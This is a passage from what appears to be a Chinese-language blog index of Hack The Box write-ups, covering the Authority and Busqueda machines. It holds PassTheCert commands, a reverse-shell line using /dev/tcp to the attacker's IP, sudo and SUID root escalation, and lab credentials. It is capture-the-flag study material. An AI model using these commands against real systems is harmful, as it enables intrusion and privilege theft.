to get TGT...\n[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#kdc_err_padata_type_nosupp","title":"KDC_ERR_PADATA_TYPE_NOSUPP","text":"<p>\u641c\u4e86\u4e00\u4e0b\u8fd9\u4e2a\u62a5\u9519\uff0c\u53d1\u73b0\u8fd9\u7bc7\u6587\u7ae0\u63d0\u5230\u4e86\u53ef\u4ee5\u7528 <code>PassTheCert</code> \u8fdb\u884cLDAP\u8ba4\u8bc1\u3002  </p> <p>If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like PassTheCert. You will only have LDAP access, but this should be enough if you have a certificate stating you\u2019re a domain admin.</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#passthecert","title":"PassTheCert","text":"<p>\u6839\u636e\u5176github\u6587\u6863\uff0c\u4ecepfx\u4e2d\u63d0\u53d6crt\u548ckey\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ certipy cert -pfx administrator_authority.pfx -nokey -out user.crt\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Writing certificate and  to 'user.crt'\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ certipy cert -pfx administrator_authority.pfx -nocert -out user.key\nCertipy v4.7.0 - by Oliver Lyak (ly4k)\n\n[*] Writing private key to 'user.key'\n</code></pre></p> <p>\u4e0b\u8f7d <code>passthecert.py</code>\uff0c\u6309\u7167\u6587\u6863\u6267\u884c\u540e\u6210\u529f\u83b7\u53d6admin\u6743\u9650\u7684 <code>ldap-shell</code>\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/HTB/Authority]\n\u2514\u2500$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\nType help for list of commands\n\n# add_user_to_group svc_ldap Administrators\nAdding user: svc_ldap to group Administrators result: OK\n\n\n\n*Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name    SID\n============ =============================================\nhtb\\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID          Attributes\n========================================== ================ ============ ===============================================================\nEveryone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner\nBUILTIN\\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level       Label            S-1-16-12288\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                            Description                                                        State\n========================================= ================================================================== =======\nSeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled\nSeMachineAccountPrivilege                 Add workstations to domain                                         Enabled\nSeSecurityPrivilege                       Manage auditing and security log                                   Enabled\nSeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled\nSeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled\nSeSystemProfilePrivilege                  Profile system performance                                         Enabled\nSeSystemtimePrivilege                     Change the system time                                             Enabled\nSeProfileSingleProcessPrivilege           Profile single process                                             Enabled\nSeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled\nSeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled\nSeBackupPrivilege                         Back up files and directories                                      Enabled\nSeRestorePrivilege                        Restore files and directories                                      Enabled\nSeShutdownPrivilege                       Shut down the system                                               Enabled\nSeDebugPrivilege                          Debug programs                                                     Enabled\nSeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled\nSeUndockPrivilege                         Remove computer from docking station                               Enabled\nSeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled\nSeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled\nSeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled\nSeCreateGlobalPrivilege                   Create global objects                                              Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled\nSeTimeZonePrivilege                       Change the time zone                                               Enabled\nSeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled\nSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#flag-root","title":"flag: root","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; ls\n\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---        7/22/2023   3:53 AM             34 root.txt\n\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; cat root.txt\nc714\uff08\u7565\uff0958d9\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Authority/#_5","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/07/22</p> <p>\u2026\u2026</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Busqueda/","title":"HTB-Busqueda","text":"","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#_1","title":"\u626b\u63cf","text":"<p>\u5e38\u89c422\u300180\u7aef\u53e3</p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#80","title":"80\u7aef\u53e3","text":"<p>IP\u65e0\u6cd5\u8bbf\u95ee\uff0c\u9700\u8981\u5199hosts\u6587\u4ef6\u3002\u57df\u540d\u5373\u6d4f\u89c8\u5668\u81ea\u52a8\u66ff\u6362\u7684\u90a3\u4e2a\u3002\u6216\u8005\u53ef\u4ee5 <code>curl -I &lt;IP&gt;</code> \u770b\u62a5\u5934\u7684 <code>Location</code> \u5b57\u6bb5\u3002</p> <ul> <li>Powered by Flask and Searchor 2.4.0</li> </ul>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#initial-access","title":"Initial Access","text":"","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#poc","title":"PoC","text":"<p>\u8c37\u6b4c\u4e00\u4e0b <code>Searchor 2.4.0</code> \u7684PoC\uff1a</p> <p>https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-</p> <p>\u6309PoC\u6240\u8bf4\uff0c\u5c06payload\u653e\u8fdbquery\u53c2\u6570\uff0c\u53cd\u5f39shell\u6210\u529f\u3002</p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#flag-user","title":"flag: user","text":"<pre><code>\u2514\u2500$ nc -lvnp 4445 \nlistening on [any] 4445 ...\nconnect to [10.xx.xx.xx] from (UNKNOWN) [10.10.11.208] 35966\n/bin/sh: 0: can't access tty; job control turned off\n$ id\nuid=1000(svc) gid=1000(svc) groups=1000(svc)\n$ pwd\n/var/www/app\n$ cd\n$ ls\nuser.txt\n$ cat user.txt\ned5d\u2026\u20268455\n</code></pre>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#_3","title":"\u63a2\u7d22","text":"","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#git","title":"git\u63a2\u7d22","text":"<p>\u5728svc\u7684\u5bb6\u76ee\u5f55\u53d1\u73b0\u6709gitconfig\u3002\u4e8e\u662f\u731c\u60f3\u662f\u5426\u80fd\u7ffb\u627egit\u5386\u53f2\u4fe1\u606f\u83b7\u5f97\u654f\u611f\u4fe1\u606f\uff1a <pre><code>$ ls -al\ntotal 36\ndrwxr-x--- 4 svc  svc  4096 Apr  3 08:58 .\ndrwxr-xr-x 3 root root 4096 Dec 22 18:56 ..\nlrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout\n-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc\ndrwx------ 2 svc  svc  4096 Feb 28 11:37 .cache\n-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig\ndrwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local\nlrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null\n-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile\nlrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null\n-rw-r----- 1 root svc    33 May 16 14:01 user.txt\n\n$ cat .gitconfig\n[user]\n        email = cody@searcher.htb\n        name = cody\n[core]\n        hooksPath = no-hooks\n\n\n$ find / -name \"*git*\" 2&gt;/dev/null\n\u2026\u2026\n/var/www/app/.git\n\u2026\u2026\n/opt/scripts/.git\n</code></pre></p> <p>\u5148\u63a2\u7d22\u4e00\u4e0b <code>/var/www/app/.git</code>\uff1a <pre><code>$ cd /var/www/app/.git\n$ ls\nbranches\nCOMMIT_EDITMSG\nconfig\ndescription\nHEAD\nhooks\nindex\ninfo\nlogs\nobjects\nrefs\n$ git log\nfatal: detected dubious ownership in repository at '/var/www/app/.git'\nTo add an exception for this directory, call:\n\n        git config --global --add safe.directory /var/www/app/.git\n</code></pre></p> <p>\u4f3c\u4e4e\u6709\u6743\u9650\u95ee\u9898\uff0c\u59d1\u4e14\u6309\u7167git\u7684\u63d0\u793a\u6267\u884c\u4e00\u4e0b\u5b83\u7ed9\u7684\u547d\u4ee4\u3002 \u7136\u540e\u5c45\u7136\u5c31\u53ef\u4ee5\u770b\u4e86\uff1a <pre><code>$ git config --global --add safe.directory /var/www/app/.git\n$ git log\ncommit 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4\nAuthor: administrator &lt;administrator@gitea.searcher.htb&gt;\nDate:   Sun Dec 25 12:14:21 2022 +0000\n\n    Initial commit\n\n$ git cat-file -p 5ede9e\ntree 467e53ba0d917346fd36b48c04f6a60a27f072f5\nauthor administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000\ncommitter administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000\n\nInitial commit\n$ git cat-file -p 467e\n100644 blob 4e76fdc6500eba1bfb9d9dc9017bd6481550ee2d    app.py\n040000 tree a02efc014401c058dca8aa73670f3283aa08a245    templates\n</code></pre></p> <p>\u4e0d\u8fc7\u63a2\u7d22\u5230\u6700\u540e\u53d1\u73b0\u6ca1\u4ec0\u4e48\u610f\u4e49\uff0c\u60f3\u60f3\u4e5f\u662f\u50bb\u4e86\u5728\u8fd9\u91cc\u6d6a\u8d39\u65f6\u95f4\u3002 \u56e0\u4e3a\u8fd9\u662f\u7b2c\u4e00\u6b21commit\uff0c\u5185\u5bb9\u5c31\u662f <code>/var/www/app/</code> \u4e0b\u7684\u9879\u76ee\uff0c\u4e5f\u5373\u6211\u4eec\u6700\u5f00\u59cb\u8bbf\u95ee\u7684\u7f51\u9875\u3002</p> <p>\u53e6\u4e00\u4e2a\uff0c<code>/opt/scripts/.git</code> \u7531\u4e8e\u662froot\u6743\u9650\u6240\u4ee5\u4e5f\u65e0\u6cd5\u63a2\u7d22\u3002</p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#_4","title":"\u53d1\u73b0\u5bc6\u7801\u548c\u5b50\u57df","text":"<p>\u7136\u540e\u770b\u770bconfig\u6587\u4ef6\uff0c\u53d1\u73b0\u4e00\u4e2a\u5b50\u57df\uff1a <pre><code>$ cat config\n[core]\n        repositoryformatversion = 0\n        filemode = true\n        bare = false\n        logallrefupdates = true\n[remote \"origin\"]\n        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git\n        fetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"main\"]\n        remote = origin\n        merge = refs/heads/main\n</code></pre></p> <p>\u5b9e\u9645\u4e0a\u8fd8\u6709cody\u7684\u8d26\u53f7\u5bc6\u7801\uff08cody:jh1usoih2bkjaspwe92\uff09\u3002 \u5c06\u5b50\u57df <code>gitea.searcher.htb</code> \u4e5f\u52a0\u5165hosts\uff0c\u53ef\u4ee5\u7528cody\u7684\u8d26\u53f7\u5bc6\u7801\u767b\u9646\u3002 \u4e0d\u8fc7\u8fdb\u53bb\u4e5f\u6ca1\u53d1\u73b0\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f\u3002</p> <p>\u5012\u662f\u6709\u4e2a <code>administrator</code> \u7528\u6237\u3002\u4e0d\u77e5\u9053\u80fd\u4e0d\u80fd\u62ff\u8fd9\u4e2a\u7528\u6237\u7684\u5bc6\u7801\uff0c\u8bf4\u4e0d\u5b9a\u5c31\u662froot\u3002  </p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#-ssh","title":"\u5bc6\u7801\u91cd\u590d - SSH","text":"<p>\u2026\u2026\u5361\u4e86\u5f88\u4e45\u2026\u2026\u8c01\u60f3\u5230svc\u7684SSH\u5bc6\u7801\u7adf\u7136\u548ccody\u4e00\u6837\u3002\u540e\u6765\u590d\u4e60hacktricks\uff0c\u53d1\u73b0\u5176\u5b9e\u8fd9\u91cc\u6709\u63d0\u5230\uff0c\u53ea\u662f\u4ee5\u524d\u8349\u8349\u626b\u8fc7\u6839\u672c\u6ca1\u5370\u8c61\u3002 \u539f\u6765cody\u7684\u5bc6\u7801svc\u4e5f\u80fd\u7528\u2026\u2026\u540e\u6765\u770b0xdf\u7684WP\u624d\u53d1\u73b0\uff0c\u539f\u6765svc\u7684\u7528\u6237\u540d\u5c31\u662fcody\u2026\u2026 \u867d\u7136\u672c\u8eab\u5c31\u6709svc\u7684shell\uff0c\u4e0d\u8fc7\u6709\u6ca1\u6709\u5bc6\u7801\u4e00\u4e2a\u5f88\u5927\u7684\u4e0d\u540c\u5c31\u662f\u662f\u5426\u80fd\u67e5\u770b <code>sudo -l</code>\u3002\u4ee5\u53ca\u5728\u8fd9\u4e4b\u524d\uff0c\u8fd8\u662f\u6362\u6210SSH\u8fde\u63a5\u5427\u3002</p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#sudo","title":"sudo\u63a2\u7d22","text":"<p>SSH\u767b\u9646\u540e\uff0c\u77e5\u9053\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u5148\u770b\u770bsudo\uff1a <pre><code>svc@busqueda:~$ sudo -l\nMatching Defaults entries for svc on busqueda:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser svc may run the following commands on busqueda:\n    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *\n\n\nsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *\nUsage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)\n\n     docker-ps     : List running docker containers\n     docker-inspect : Inpect a certain docker container\n     full-checkup  : Run a full system checkup\n\nsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps\nCONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES\n960873171e2e   gitea/gitea:latest   \"/usr/bin/entrypoint\u2026\"   4 months ago   Up 3 hours   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea\nf84a6b33fb5a   mysql:8              \"docker-entrypoint.s\u2026\"   4 months ago   Up 3 hours   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db\n\nsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect\nUsage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;\n\nsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect ps f84a6b33fb5a\nps\nsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect id f84a6b33fb5a\nid\n</code></pre></p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#sudo_1","title":"\u5229\u7528sudo\u83b7\u5f97\u654f\u611f\u4fe1\u606f","text":"<p>\u50cf\u662fdocker\u672c\u8eab\u7684\u547d\u4ee4\u7136\u540e\u7528\u8fde\u5b57\u7b26\u8fde\u63a5\u7ec4\u6210\u7684\u65b0\u547d\u4ee4\u3002\u7136\u540e\u5c1d\u8bd5\u4e86\u51e0\u6b21\u8fd0\u884c\u8fd9\u4e2a <code>docker-inspect</code> \u547d\u4ee4\uff0c\u4e0d\u8fc7\u7531\u4e8e\u4e0d\u61c2\u8fd9\u4e2a <code>&lt;format&gt;</code> \u662f\u6307\u5565\u3002\u4e8e\u662f\u641c\u4e86\u4e00\u6ce2\uff1a</p> <p>https://docs.docker.jp/config/formatting.html#json https://docs.docker.com/engine/reference/commandline/inspect/#get-a-subsection-in-json-format</p> <p>\u770b\u6765\u53ef\u4ee5\u5c06\u5bb9\u5668\u542f\u52a8\u65f6\u7684\u914d\u7f6e\u4fe1\u606f\u7528json\u8f93\u51fa\uff1a <pre><code>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a6b33fb5a\n{\"Hostname\":\"f84a6b33fb5a\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"3306/tcp\":{},\"33060/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF\",\"MYSQL_USER=gitea\",\"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh\",\"MYSQL_DATABASE=gitea\",\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"GOSU_VERSION=1.14\",\"MYSQL_MAJOR=8.0\",\"MYSQL_VERSION=8.0.31-1.el8\",\"MYSQL_SHELL_VERSION=8.0.31-1.el8\"],\"Cmd\":[\"mysqld\"],\"Image\":\"mysql:8\",\"Volumes\":{\"/var/lib/mysql\":{}},\"WorkingDir\":\"\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":{\"com.docker.compose.config-hash\":\"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b\",\"com.docker.compose.container-number\":\"1\",\"com.docker.compose.oneoff\":\"False\",\"com.docker.compose.project\":\"docker\",\"com.docker.compose.project.config_files\":\"docker-compose.yml\",\"com.docker.compose.project.working_dir\":\"/root/scripts/docker\",\"com.docker.compose.service\":\"db\",\"com.docker.compose.version\":\"1.29.2\"}}\n</code></pre></p> <p>\u6ce8\u610f\u5230\uff1a <pre><code>\"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF\",\n\"MYSQL_USER=gitea\",\n\"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh\",\n\"MYSQL_DATABASE=gitea\",\n</code></pre></p> <p>\u5c1d\u8bd5\u7528root\u767b\u9646SSH\u5931\u8d25\u3002</p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#giteaadministrator","title":"gitea\u767b\u9646administrator","text":"<p>\u56de\u5230gitea\uff0c\u5c1d\u8bd5\u767b\u9646administrator\u8d26\u53f7\u3002\u7adf\u7136\u4e0d\u662f\u7528MYSQL_ROOT_PASSWORD\uff0c\u800c\u662fMYSQL_PASSWORD\u3002\u8fd9\u53f0\u9776\u673a\u7684\u5bc6\u7801\u90fd\u6709\u70b9\u8ff7\u2026\u2026</p> <p>\u91cc\u9762\u6709\u4e2a\u79c1\u4eba\u4ed3\u5e93\uff0c\u626b\u4e86\u4e00\u5708\u6ce8\u610f\u5230 <code>full-checkup.sh</code>\uff1a <pre><code>#!/bin/bash\nimport subprocess\nimport sys\n\nactions = ['full-checkup', 'docker-ps','docker-inspect']\n\ndef run_command(arg_list):\n    r = subprocess.run(arg_list, capture_output=True)\n    if r.stderr:\n        output = r.stderr.decode()\n    else:\n        output = r.stdout.decode()\n\n    return output\n\n\ndef process_action(action):\n    if action == 'docker-inspect':\n        try:\n            _format = sys.argv[2]\n            if len(_format) == 0:\n                print(f\"Format can't be empty\")\n                exit(1)\n            container = sys.argv[3]\n            arg_list = ['docker', 'inspect', '--format', _format, container]\n            print(run_command(arg_list)) \n\n        except IndexError:\n            print(f\"Usage: {sys.argv[0]} docker-inspect &lt;format&gt; &lt;container_name&gt;\")\n            exit(1)\n\n        except Exception as e:\n            print('Something went wrong')\n            exit(1)\n\n    elif action == 'docker-ps':\n        try:\n            arg_list = ['docker', 'ps']\n            print(run_command(arg_list)) \n\n        except:\n            print('Something went wrong')\n            exit(1)\n\n    elif action == 'full-checkup':\n        try:\n            arg_list = ['./full-checkup.sh']\n            print(run_command(arg_list))\n            print('[+] Done!')\n        except:\n            print('Something went wrong')\n            exit(1)\n\n\nif __name__ == '__main__':\n\n    try:\n        action = sys.argv[1]\n        if action in actions:\n            process_action(action)\n        else:\n            raise IndexError\n\n    except IndexError:\n        print(f'Usage: {sys.argv[0]} &lt;action&gt; (arg1) (arg2)')\n        print('')\n        print('     docker-ps     : List running docker containers')\n        print('     docker-inspect : Inpect a certain docker container')\n        print('     full-checkup  : Run a full system checkup')\n        print('')\n        exit(1)\n</code></pre></p> <p>\u5176\u5b9e\u524d\u9635\u5b50\u4e5f\u60f3\u7740\u5b66\u5b66python\u7684subprocess\u5e93\u6765\u7740\uff0c\u611f\u89c9\u8fd9\u662f\u4e2a\u4e0d\u9519\u7684\u4f8b\u5b50\u3002</p> <p>\u5176\u4e2d <code>arg_list = ['./full-checkup.sh']</code> \u6307\u793a\u8fd0\u884c\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u811a\u672c\u3002\u5e94\u8be5\u662f\u4e2a\u53ef\u4ee5\u5229\u7528\u7684\u70b9\uff1a\u81ea\u5efa\u540c\u540d\u811a\u672c\uff0c\u6267\u884c\u53cd\u5411shell\u8fde\u63a5\u3002</p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#sudo_2","title":"sudo\u63d0\u6743\uff08\u673a\u5668\u672c\u8eab\u8def\u7ebf\uff09","text":"<pre><code>\u9776\u673a\uff1a\nsvc@busqueda:~/.local$ cat full-checkup.sh \n#!/usr/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/10.xx.xx.xx/4446 0&gt;&amp;1\n\nsvc@busqueda:~/.local$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n\n\nKali\uff1a\n\u2514\u2500$ nc -lvnp 4446    \nlistening on [any] 4446 ...\nconnect to [10.xx.xx.xx] from (UNKNOWN) [10.10.11.208] 41116\nroot@busqueda:/home/svc/.local# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>\u6ce8\u610f\uff1a\u7531\u4e8e\u662f <code>./</code> \u6267\u884c\u811a\u672c\uff0c\u6240\u4ee5\u9700\u8981\u5728\u811a\u672c\u5f00\u5934\u5199Shebang\uff0c\u4ee5\u53ca\u7ed9\u811a\u672c\u8d4b\u4e88\u6267\u884c\u6743\u9650\u3002</p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#suid","title":"SUID\u63d0\u6743\uff08\u975e\u673a\u5668\u672c\u8eab\u8def\u7ebf\uff09","text":"<p>\u679a\u4e3eSUID\uff0c\u6ce8\u610f\u5230\u6709\u4e2abash\u6211\u90fd\u60ca\u4e86\u3002\u60f3\u7740\u4e0d\u4f1a\u8fd9\u4e48\u7b80\u5355\u5427\uff0c\u8bd5\u4e86\u4e00\u4e0b\u7adf\u7136\u76f4\u63a5root\u4e86\u2026\u2026</p> <p>\u540e\u6765\u611f\u89c9\u53ef\u80fd\u662f\u5176\u4ed6\u73a9\u5bb6getshell\u7559\u4e0b\u7684\u64cd\u4f5c\u3002\u4e8e\u662f\u91cd\u7f6e\u4e86\u4e00\u4e0b\uff0c\u679c\u7136\u8fd9\u4e2abash\u5c31\u6d88\u5931\u4e86\u3002\u4e8e\u662f\u53c8\u91cd\u65b0\u6253\u4e86\u4e00\u904d\u3002\u5373\u4e0a\u4e00\u5c0f\u8282\u7684\u5185\u5bb9\u3002</p> <pre><code>$ find / -perm -4000 -exec ls -l \"{}\" \\; 2&gt;/dev/null\n\u2026\u2026\n-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /usr/bin/bash\n\u2026\u2026\n\n$ which bash\n/usr/bin/bash\n$ bash -p \nid\nuid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root) groups=0(root)\n</code></pre>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#flag-root","title":"flag: root","text":"<pre><code>cd /root\nls\necosystem.config.js\nroot.txt\nscripts\nsnap\ncat root.txt\n05d0\u2026\u20269f41\n</code></pre>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#_5","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/05/16</p> <p>\u5927\u6982\u662f\u6211\u6253\u8fc7\u7684\u6700\u7b80\u5355\u7684\u673a\u5668\u4e86\u2026\u2026  </p> <p>\u4e0d\u8fc7\u4e3b\u8981\u662f\u56e0\u4e3a\u521d\u59cb\u8bbf\u95ee\u5df2\u7ecf\u5728github\u6709PoC\uff0c\u770b\u65f6\u95f4\u5e94\u8be5\u4e5f\u662f\u4e00\u4f4d\u6253\u8fd9\u4e2a\u9776\u673a\u7684\u73a9\u5bb6\u6240\u521b\u5efa\u7684\u4ed3\u5e93\u3002\u6240\u4ee5\u5b9e\u8d28\u4e0a\u81ea\u5df1\u548c\u770bWP\u6ca1\u4ec0\u4e48\u5dee\u522b\u4e86\u3002\u5e0c\u671b\u81ea\u5df1\u4e5f\u80fd\u5199\u51fa\u4e00\u4e2aPoC\u5427\uff01</p> <p>\u800croot\u7b80\u76f4\u8fc7\u4e8e\u5feb\u4e86\u2026\u2026\u611f\u89c9\u8bbe\u8ba1\u8005\u672c\u8eab\u7684root\u63d0\u6743\u5e94\u8be5\u4e0d\u662f\u8fd9\u6837\uff1f1\u79d2root\uff0c\u5341\u5206\u8212\u7545\u3002</p> <p>\u540e\u6765\u53d1\u73b0\u5929\u771f\u4e86\u3002\u53ea\u662f\u7ad9\u5728\u4e86\u5de8\u4eba\u7684\u80a9\u8180\u4e0a\u3002\u81ea\u5df1\u91cd\u7f6e\u9776\u673a\u540e\u518d\u6309\u5e38\u89c4\u8def\u7ebf\u6253\u4e00\u904d\u4e5f\u4e0d\u5927\u5bb9\u6613\uff0c\u4e3b\u8981\u662f\u4e00\u76f4\u6ca1\u60f3\u8fc7\u771f\u6709\u5bc6\u7801\u91cd\u590d\u8fd9\u79cd\u8fc7\u4e8e\u7b80\u5355\u7684\u601d\u8def\u2026\u2026\u4ee5\u540e\u4e5f\u8981\u6ce8\u610f\u8fd9\u65b9\u9762\u7684\u5229\u7528\u4e86</p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#_6","title":"\u7a0d\u5fae\u6539\u4e00\u4e0b\u626b\u63cf\u7684\u5de5\u4f5c\u6d41","text":"<pre><code>#!/usr/bin/bash\n# -*- coding:utf-8 -*-\n\n## This script is requires root privilege for running.\nset -eu\n\nHTB_IP=${1}\n\necho \"[info] Starting ports scan...\"\nnmap -n -Pn -sS -p 1-10000 --min-rate=5000 ${HTB_IP} | tee \"${HTB_IP}_ports_1-10000.nmap\"\n\necho \"[info] Starting base scan...\"\nports=$(cat \"${HTB_IP}_ports_1-10000.nmap\" | grep ^[0-9] | cut -d / -f1 | tr 